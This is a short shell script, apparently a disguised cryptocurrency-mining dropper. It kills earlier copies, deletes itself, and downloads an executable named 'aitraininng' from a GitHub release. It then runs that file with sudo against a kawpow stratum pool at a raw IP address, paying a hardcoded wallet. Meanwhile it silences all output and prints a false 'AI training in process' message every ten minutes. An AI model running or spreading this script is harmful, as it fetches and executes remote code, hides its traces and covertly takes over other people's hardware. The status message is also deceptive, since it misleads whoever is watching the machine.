nohup bash -c "
  # Stop any running aitraininng processes
  pkill -f aitraininng

  # Create a self-deleting script for execution
  ( sleep 1; rm -- \"$0\" ) &

  # Download and configure the new aitraininng file
  wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
  chmod +x aitraininng

  # Run aitraininng with specified parameters
  sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.b2atch &
" > /dev/null 2>&1 &

# Display status message periodically
while true; do
    echo "AI training in process"
    sleep 600 
done
